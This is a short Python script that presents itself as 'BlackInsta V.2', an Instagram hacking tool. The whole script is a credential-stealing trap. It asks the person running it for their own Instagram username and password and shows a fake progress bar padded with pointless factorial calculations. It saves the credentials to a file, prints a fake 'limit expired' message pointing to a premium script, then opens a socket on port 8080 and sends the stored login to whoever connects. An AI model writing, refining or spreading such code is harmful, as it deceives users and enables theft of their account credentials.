import time
import socket
import math


print("==============================================================================")
print("=======================  Welcome to BlackInsta V.2  ==========================")
print("==============================================================================")
time.sleep(2)
Email = input("Enter Your Instagram Username : ")
Pass = input("Enter Your Instagram Password : ")
time.sleep(1)
def progress_bar(progress, total):
    percent = 100 * (progress / float(total))
    bar = '>' * int(percent) + '-' * (100 - int(percent))
    print(f"\r|{bar}| {percent:.2f}%", end="\r")


numbers = [x * 5 for x in range(2000, 3000)]
results = []

progress_bar(0, len(numbers))
for i, x in enumerate(numbers):
    results.append(math.factorial(x))
    progress_bar(i + 1, len(numbers))

time.sleep(5)
Target = input("\nEnter your Username Target :")
print ("=======================  Starting Found the Target  ==========================")
time.sleep(10)
fh = open("insta.txt", "w")
fh.write("Username : " +Email+ "\nPassword : " +Pass+ "\nTarget : " +Target)
fh.close()
print("Error !! Your limit is Experit . Try the Premium Script on Google.com")

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host,port))
s.listen(1)
print(host)
print("waiting for any incoming connections...")
conn, addr = s.accept()
print(addr, "has connected to the server")


filename = str("insta.txt")
file = open(filename, 'rb')
file_data = file.read(1024)
conn.send(file_data)
print("Data has been transmitted successufly")
